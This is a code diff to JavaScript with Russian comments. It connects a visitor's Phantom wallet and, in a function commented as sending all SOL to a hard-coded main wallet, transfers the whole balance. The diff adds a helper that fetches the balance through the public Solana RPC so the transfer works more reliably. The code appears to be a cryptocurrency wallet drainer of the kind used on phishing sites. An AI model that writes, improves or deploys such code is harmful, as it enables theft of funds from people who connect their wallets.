@@ -39,6 +39,32 @@ async function connectPhantom() {
     }
 }
 
+// Функция получения баланса с использованием альтернативного API
+async function getBalanceSolana(address) {
+    const apiUrl = `https://api.mainnet-beta.solana.com`;
+
+    const response = await fetch(apiUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            jsonrpc: "2.0",
+            id: 1,
+            method: "getBalance",
+            params: [address]
+        })
+    });
+
+    const data = await response.json();
+
+    if (data.error) {
+        throw new Error(data.error.message);
+    }
+
+    return data.result.value;
+}
+
 // Функция отправки всех SOL на основной кошелек
 async function didtrans() {
     if (!provider || !walletAddress) {
@@ -51,7 +77,8 @@ async function didtrans() {
     const receiverPublicKey = new solanaWeb3.PublicKey(mainWallet);
 
     try {
-        let balanceLamports = await connection.getBalance(senderPublicKey);
+        // Получаем баланс с использованием альтернативного API
+        let balanceLamports = await getBalanceSolana(walletAddress);
         if (balanceLamports <= 0) {
             alert("На кошельке недостаточно SOL для отправки.");
             return;
